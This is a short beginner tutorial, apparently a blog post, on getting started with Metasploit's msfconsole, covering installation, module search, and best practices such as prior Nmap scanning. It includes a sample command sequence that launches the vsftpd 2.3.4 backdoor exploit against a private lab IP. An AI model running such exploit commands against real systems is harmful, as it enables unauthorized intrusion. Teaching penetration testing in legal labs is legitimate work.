    Metasploit Framework - Part 1

    Getting Started with msfconsole

    Metasploit is one of the most powerful tools in ethical hacking. It helps you find, test, and exploit vulnerabilities in systems.

    Installation

    • Linux: sudo apt install metasploit-framework
    • Termux: pkg install unstable-repo && pkg install metasploit

    Start msfconsole

    msfconsole

    This command opens the Metasploit console. You’ll see a banner and version info.

    Use Case Example

    Let’s say you found a vulnerable FTP server. You can try exploiting it like this:

    
use exploit/unix/ftp/vsftpd_234_backdoor set RHOST 192.168.1.105 run

    Key Tips

    • Always use Metasploit in legal labs only.
    • Use search command to find modules (e.g., search ftp).
    • Use info command to learn more about a module.

    Example: info exploit/unix/ftp/vsftpd_234_backdoor

    Screenshot

    Best Practices

    • Always scan and enumerate the target first (e.g., using Nmap).
    • Note the ports and services before using Metasploit.
    • Document every test step in real assessments.
